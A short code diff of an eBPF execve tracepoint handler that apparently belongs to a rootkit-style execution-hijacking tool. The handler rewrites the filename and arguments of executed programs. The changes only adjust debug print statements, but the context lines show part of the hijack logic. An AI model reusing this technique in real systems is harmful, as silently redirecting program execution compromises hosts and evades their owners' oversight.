@@ -115,7 +115,7 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
     if((void*)ctx->filename==(void*)(ctx->argv)){
         bpf_printk("Equal pointers");
     }else{
-        bpf_printk("Not equal pointers %u, %u", ctx->filename, ctx->argv);
+        //bpf_printk("Not equal pointers %u, %u", ctx->filename, ctx->argv);
     }
 
     if(str_n_compare((char*)filename, ARGUMENT_LENGTH, (char*)PATH_EXECUTION_HIJACK_PROGRAM, sizeof(PATH_EXECUTION_HIJACK_PROGRAM), sizeof(PATH_EXECUTION_HIJACK_PROGRAM)-1)!=0){
@@ -168,7 +168,6 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
         return -1;
     }
      
-    bpf_printk("One success\n");
     hijacker_state = 1;
 
     unsigned char newfilename[ARGUMENT_LENGTH] = {0};
@@ -182,9 +181,9 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
 
     bpf_printk("SUCCESS NEW FILENAME: %s\n", newfilename);
     bpf_printk("NEW ARGV0: %s\n\n", newargv[0]);
-    /*bpf_printk("ARGV1: %s\n", argv[1]);
-    bpf_printk("ARGV2: %s\n", argv[2]);
-    bpf_printk("ORIGINAL %s\n\n", filename);*/
+    bpf_printk("NEW ARGV1: %s\n", newargv[1]);
+    bpf_printk("NEW ARGV2: %s\n", newargv[2]);
+    //bpf_printk("ORIGINAL %s\n\n", filename);
 
     return 0;
 }
